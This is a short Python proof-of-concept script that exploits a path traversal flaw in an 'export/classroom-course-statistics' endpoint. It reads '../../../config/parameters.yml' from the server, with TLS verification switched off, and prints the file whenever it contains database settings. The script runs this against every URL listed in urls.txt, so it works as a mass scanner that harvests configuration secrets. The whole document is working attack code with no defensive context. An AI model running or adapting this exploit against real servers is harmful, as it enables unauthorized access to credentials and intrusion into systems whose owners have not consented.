import requests
import warnings
warnings.filterwarnings("ignore")

def poc(url):
    # Target URL,
    url = f"{url}export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml"


    # Headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0'
    }

    # Sending the GET request
    response = requests.get(url, headers=headers,verify=False,timeout=5)

    # Print the response from the server
    if response.status_code == 200:
        print(url,"\nSuccessfully retrieved the file:")
        if "database" in response.text:
            print(response.text)
            input("Press Enter to continue...")
    else:
        print(url)
        print("Failed to retrieve the file.\n",response.status_code)



with open("urls.txt", "r") as file:
        urls = list(set(file.readlines()))
for url in urls:
    poc(url.strip())